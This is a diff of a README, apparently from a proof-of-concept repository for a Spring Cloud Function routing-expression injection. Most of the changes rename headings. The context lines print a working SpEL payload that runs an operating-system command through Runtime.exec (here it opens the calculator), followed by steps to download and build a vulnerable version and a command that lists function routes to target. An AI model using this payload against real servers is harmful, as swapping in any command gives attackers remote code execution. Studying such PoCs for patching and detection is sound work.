@@ -5,7 +5,7 @@ header
 ```
 spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("open -a calculator.app")
 ```
-## Poc
+# build
 ```bash
 wget https://github.com/spring-cloud/spring-cloud-function/archive/refs/tags/v3.1.6.zip
 unzip v3.1.6.zip
@@ -16,8 +16,10 @@ java -jar ./target/function-sample-pojo-2.0.0.RELEASE.jar
 ```
 <img width="1236" alt="image" src="https://user-images.githubusercontent.com/18223385/160410727-35bf6bae-bb32-48c1-9081-edeef1e510f1.png">
 
-#### get path lists
-$ find . -name "*.java"|xargs -I % cat %|grep -Eo '"([^" \.\/=>\|,:\}\+\)'"'"']{8,})"'|sort -u|sed 's/"//g'
+# get path lists for test
+```bash
+find . -name "*.java"|xargs -I % cat %|grep -Eo '"([^" \.\/=>\|,:\}\+\)'"'"']{8,})"'|sort -u|sed 's/"//g'
+```
 ...
 functionRouter
 uppercase
